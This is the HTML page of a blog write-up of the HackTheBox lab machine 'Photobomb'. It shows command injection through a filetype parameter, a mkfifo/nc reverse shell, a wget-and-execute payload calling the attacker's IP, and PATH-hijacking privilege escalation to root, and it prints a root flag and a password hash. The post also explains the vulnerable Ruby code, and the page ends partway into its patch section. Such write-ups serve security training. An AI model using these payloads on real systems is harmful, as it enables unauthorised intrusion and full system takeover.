@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Photobomb" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ web enumeration, viewing the page source of the index page reveals a javascript file photobomb.js containing credentials for /printer. /printer directory is a tool that allow users to download the images that are displayed, however it is susceptible to a command injection vulnerability, specifically the filetype POST parameter, due to the lack of input sanitization, allowing us to invoke a reverse shell, obtaining a low-privilege/wizard user." /><meta property="og:description" content="Overview This machine begins w/ web enumeration, viewing the page source of the index page reveals a javascript file photobomb.js containing credentials for /printer. /printer directory is a tool that allow users to download the images that are displayed, however it is susceptible to a command injection vulnerability, specifically the filetype POST parameter, due to the lack of input sanitization, allowing us to invoke a reverse shell, obtaining a low-privilege/wizard user." /><link rel="canonical" href="https://yufongg.github.io/posts/Photobomb/" /><meta property="og:url" content="https://yufongg.github.io/posts/Photobomb/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-16T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Photobomb" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-10-16T00:00:00+08:00","description":"Overview This machine begins w/ web enumeration, viewing the page source of the index page reveals a javascript file photobomb.js containing credentials for /printer. /printer directory is a tool that allow users to download the images that are displayed, however it is susceptible to a command injection vulnerability, specifically the filetype POST parameter, due to the lack of input sanitization, allowing us to invoke a reverse shell, obtaining a low-privilege/wizard user.","headline":"HackTheBox - Photobomb","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Photobomb/"},"url":"https://yufongg.github.io/posts/Photobomb/"}</script><title>HackTheBox - Photobomb | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Photobomb</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015154250.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Photobomb</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1665849600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-10-16 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1355 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ web enumeration, viewing the page source of the index page reveals a javascript file <code class="language-plaintext highlighter-rouge">photobomb.js</code> containing credentials for <code class="language-plaintext highlighter-rouge">/printer</code>. <code class="language-plaintext highlighter-rouge">/printer</code> directory is a tool that allow users to download the images that are displayed, however it is susceptible to a command injection vulnerability, specifically the <code class="language-plaintext highlighter-rouge">filetype</code> POST parameter, due to the lack of input sanitization, allowing us to invoke a reverse shell, obtaining a low-privilege/<code class="language-plaintext highlighter-rouge">wizard</code> user.</p><p>After enumerating the system, user <code class="language-plaintext highlighter-rouge">wizard</code> has a sudoers entry that allows user <code class="language-plaintext highlighter-rouge">wizard</code> to execute <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> as root and <code class="language-plaintext highlighter-rouge">SETENV</code> set the path environment. After analyzing <code class="language-plaintext highlighter-rouge">cleanup.sh</code> script, it is susceptible to a PATH Hijacking exploit due to calling <code class="language-plaintext highlighter-rouge">find</code> &amp; <code class="language-plaintext highlighter-rouge">chown</code> w/o its FULL PATH, by creating a malicious script also called <code class="language-plaintext highlighter-rouge">find</code> or <code class="language-plaintext highlighter-rouge">chown</code> at a writable directory (<code class="language-plaintext highlighter-rouge">/tmp</code>), we are able to execute <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> and prepend <code class="language-plaintext highlighter-rouge">/tmp</code> to the PATH environment, causing our malicious script to execute first, instead of the actual binary, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code>.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Photobomb<tr><td>IP<td>10.10.11.182<tr><td>Points<td>20<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/85231">slartibartfast</a><tr><td>Release Date<td>08 Oct 2022</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<blockquote class="prompt-info"><div><p>Nothing interesting enumerated</p></div></blockquote></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---printer-basic-authentication-creds-found">TCP/80 (HTTP) - /printer (Basic Authentication), Creds Found <a href="#tcp80-http---printer-basic-authentication-creds-found" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found a password protected directory, <code class="language-plaintext highlighter-rouge">/printer</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015154826.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><p>Basic Authentication</p></div></blockquote><li>Credentials for the encrypted directory can be in a <code class="language-plaintext highlighter-rouge">.js</code> file that the page is referencing <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015155326.png" alt="" data-proofer-ignore><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
+ └─# curl http://photobomb.htb/photobomb.js
+ function init() {
+   // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+   if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+     document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
+   }
+ }
+ window.onload = init;
+</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li><code class="language-plaintext highlighter-rouge">pH0t0:b0Mb!</code></ul></div></blockquote><li>Successfully login w/ <code class="language-plaintext highlighter-rouge">pH0t0:b0Mb!</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015155819.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/printer</code> allows authenticated users to select an image, change its dimensions, file extension (<code class="language-plaintext highlighter-rouge">.jpg, .png</code>) and download it.</p></div></blockquote></ol><h2 id="tcp80-http---printer-command-injection">TCP/80 (HTTP) - /printer, Command Injection <a href="#tcp80-http---printer-command-injection" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Download an image, intercept the request w/ <code class="language-plaintext highlighter-rouge">burp</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015160228.png" alt="" data-proofer-ignore><ul><li>Parameters: <code class="language-plaintext highlighter-rouge">photo</code>, <code class="language-plaintext highlighter-rouge">filetype</code>, <code class="language-plaintext highlighter-rouge">dimensions</code></ul><li>Determine if the parameters are susceptible to SQLi<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
+ └─# sqlmap -r printer.req --batch
+	
+ [13:54:59] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more t
+ ests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2com
+ ment') and/or switch '--random-agent'
+ [13:54:59] [WARNING] HTTP error codes detected during run:
+ 500 (Internal Server Error) - 219 times
+	
+ [*] ending @ 13:54:59 /2022-10-15/
+</pre></table></code></div></div><ul><li>Failed</ul><li>After some testing, I can conclude that<ul><li>This is a valid request <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015162531.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">photo</code> - specify photo name, must match the photo that exists on the webserver, <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015161904.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><p>any invalid name will cause a <code class="language-plaintext highlighter-rouge">500 Internal Server Error - Source photo does not exist</code></p></div></blockquote><li><code class="language-plaintext highlighter-rouge">filetype</code> - specify file type (<code class="language-plaintext highlighter-rouge">jpg</code>, <code class="language-plaintext highlighter-rouge">png</code>) only, <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015162415.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><ul><li>however we are able to append anything as long as <code class="language-plaintext highlighter-rouge">jpg</code> or <code class="language-plaintext highlighter-rouge">png</code> is infront of the appended text.<li>We can see that the request is processed <code class="language-plaintext highlighter-rouge">filename=andrea-de-santis-uCFuP0Gc_MM-unsplash_1x1.jpg testing 123</code></ul></div></blockquote><li><code class="language-plaintext highlighter-rouge">dimensions</code> - specify dimension <code class="language-plaintext highlighter-rouge">numberxnumber</code></ul><li>Determine if <code class="language-plaintext highlighter-rouge">filetype</code> <code class="language-plaintext highlighter-rouge">POST</code> parameter is susceptible to command injection<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> # Payload
+ photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&amp;filetype=jpg; echo "Vulnerable to Command Injection!" | nc 10.10.14.39 4444&amp;dimensions=1x1
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015163028.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/photobomb]
+ └─# nc -nvlp 4444
+ Ncat: Version 7.92 ( https://nmap.org/ncat )
+ Ncat: Listening on :::4444
+ Ncat: Listening on 0.0.0.0:4444
+ Ncat: Connection from 10.10.11.182.
+ Ncat: Connection from 10.10.11.182:35828.
+ Vulnerable to Command Injection!
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p>It is vulnerable !</p></div></blockquote><li>Could not Invoke reverse shell, instead we download a reverse shell payload onto <code class="language-plaintext highlighter-rouge">photobomb.htb</code> and execute it<li>Create reverse shell payload<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> <span class="c">#!/bin/bash</span>
+ <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.39 4444 <span class="o">&gt;</span>/tmp/f
+</pre></table></code></div></div><li>Host reverse shell payload<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
+ └─# python3 -m http.server 80
+</pre></table></code></div></div><li>Download it onto <code class="language-plaintext highlighter-rouge">photobomb.htb</code> &amp; execute it!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> # Payload
+ jpg;wget -O /tmp/exploit.sh 10.10.14.39/exploit.sh; chmod 777 /tmp/exploit.sh; sh /tmp/exploit.sh
+</pre></table></code></div></div><li>Demo - <code class="language-plaintext highlighter-rouge">filetype</code> Command Injection <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/wQdRpvmb8B.gif" alt="" data-proofer-ignore><li>Demo - Invoke reverse shell <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/wUaaQzhRG9.gif" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---enumeration">Root - Enumeration <a href="#root---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View <code class="language-plaintext highlighter-rouge">wizard</code> sudo access<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> wizard@photobomb:~$ sudo -l
+ Matching Defaults entries for wizard on photobomb:
+     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+	
+ User wizard may run the following commands on photobomb:
+     (root) SETENV: NOPASSWD: /opt/cleanup.sh
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">SETENV</code> &amp; execute <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> as root</p></div></blockquote><li>View <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre> wizard@photobomb:~$ cat /opt/cleanup.sh
+ #!/bin/bash
+ . /opt/.bashrc
+ cd /home/wizard/photobomb
+	
+ # clean up log files
+ if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
+ then
+   /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+   /usr/bin/truncate -s0 log/photobomb.log
+ fi
+	
+ # protect the priceless originals
+ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">find</code> &amp; <code class="language-plaintext highlighter-rouge">chown</code> is not called w/ its FULL PATH, thus it is susceptible to PATH Hijacking</p></div></blockquote><li>What is PATH Hijacking<ol><li>When a command is executed w/o its full path, the system searches through the PATH environment variable for the specified command.<li>Since we are able to <code class="language-plaintext highlighter-rouge">SETENV</code>, we can easily prepend a writable PATH (<code class="language-plaintext highlighter-rouge">/tmp</code>)<li>Create a malicious binary at <code class="language-plaintext highlighter-rouge">/tmp</code> named the same as the binary that is not called w/ its FULL PATH<li>Since <code class="language-plaintext highlighter-rouge">/tmp</code> is the first PATH in our path environment variable, <code class="language-plaintext highlighter-rouge">/tmp/find</code> will be invoked first, instead of the actual binary, allowing us to privilege escalate.</ol></ol><h2 id="root---sudo-setenv-path-hijacking">Root - SUDO SETENV PATH Hijacking <a href="#root---sudo-setenv-path-hijacking" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>How do exploit <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> (PATH Hijacking)<ol><li>Since <code class="language-plaintext highlighter-rouge">find</code> is not called w/ its FULL PATH, we are able to do PATH Hijacking.<li>Create a malicious script/binary called <code class="language-plaintext highlighter-rouge">find</code> at <code class="language-plaintext highlighter-rouge">/tmp</code> directory<li>Execute <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> and prepend <code class="language-plaintext highlighter-rouge">/tmp</code> to the PATH environment variable.<li>When <code class="language-plaintext highlighter-rouge">find</code> is called, the system will search <code class="language-plaintext highlighter-rouge">/tmp</code> directory and locates <code class="language-plaintext highlighter-rouge">find</code> and executes it, instead of the actual find binary, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code>.</ol><li>Exploiting <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> (PATH Hijacking)<ol><li>Create reverse shell script <code class="language-plaintext highlighter-rouge">find</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> wizard@photobomb:/tmp$ nano find
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.104 4444 &gt;/tmp/f
+		
+ wizard@photobomb:/tmp$ nano find
+ wizard@photobomb:/tmp$ chmod +x find
+</pre></table></code></div></div><li>Execute <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> as root and prepend <code class="language-plaintext highlighter-rouge">/tmp</code> to the PATH environment variable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">root</code> shell obtained<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/photobomb]
+ └─# nc -nvlp 4444
+ Ncat: Version 7.92 ( https://nmap.org/ncat )
+ Ncat: Listening on :::4444
+ Ncat: Listening on 0.0.0.0:4444
+ Ncat: Connection from 10.10.11.182.
+ Ncat: Connection from 10.10.11.182:35754.
+ # id;whoami
+ uid=0(root) gid=0(root) groups=0(root)
+ croot
+ # d /root
+ l# s
+ root.txt
+ # cat root.txt
+ 84da75742fa76a4a515ed0665a5d1c29
+ #
+</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">chown</code> works as well!</ol><li>Demo - PATH Hijacking privilege escalation <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/XWWK8oMGto.gif" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">root</code> hash<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> $6$7MU2U.CeiY0WX91P$TUNn8zNu/XUPSgURRJbzYvnnawpZdGhsWiLSpVrm1cIx9Rev7V/yQ5x58gTy98zcXrv6RqlWRtXcbhEhTl3240
+</pre></table></code></div></div></ol><h1 id="additional">Additional</h1><h2 id="how-did-the-command-injection-exploit-work">How did the Command Injection exploit work? <a href="#how-did-the-command-injection-exploit-work" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View <code class="language-plaintext highlighter-rouge">server.rb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre> ...SNIP...
+ post '/printer' do
+   photo = params[:photo]
+   filetype = params[:filetype]
+   dimensions = params[:dimensions]
+	
+   if !filetype.match(/^(png|jpg)/)
+     halt 500, 'Invalid filetype.'
+   end
+	
+   filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
+   response['Content-Disposition'] = "attachment; filename=#{filename}"
+	
+   if !File.exists?('resized_images/' + filename)
+     command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
+     puts "Executing: #{command}"
+     system(command)
+   else
+     puts "File already exists."
+   end
+ ...SNIP...
+</pre></table></code></div></div><blockquote class="prompt-info"><div><ol><li><code class="language-plaintext highlighter-rouge">/printer</code> accepts 3 <code class="language-plaintext highlighter-rouge">POST</code> parameters, <code class="language-plaintext highlighter-rouge">photo</code>, <code class="language-plaintext highlighter-rouge">filetype</code>, <code class="language-plaintext highlighter-rouge">dimensions</code><li><code class="language-plaintext highlighter-rouge">filetype</code> <code class="language-plaintext highlighter-rouge">POST</code> parameter is susceptible to a command injection attack due to the lack of input sanitization, the webserver checks whether <code class="language-plaintext highlighter-rouge">filetype</code> <code class="language-plaintext highlighter-rouge">POST</code> parameter starts w/ <code class="language-plaintext highlighter-rouge">png</code> or <code class="language-plaintext highlighter-rouge">jpg</code>.<li>This means that <code class="language-plaintext highlighter-rouge">png ;&lt;Command Injection)</code>, <code class="language-plaintext highlighter-rouge">jpg &lt;Command Injection&gt;</code> is valid.<li>Next, the <code class="language-plaintext highlighter-rouge">filetype</code> parameter is directly passed into <code class="language-plaintext highlighter-rouge">system</code> where code execution happens, thus we are able to do command injection.</ol></div></blockquote></ol><h2 id="patch-command-injection-vulnerability">Patch Command Injection Vulnerability <a href="#patch-command-injection-vulnerability" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Add another check for <code class="language-plaintext highlighter-rouge">POST</code> parameter <code class="language-plaintext highlighter-rouge">filetype</code><div class="language-ruby highlighter-rouge"><div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
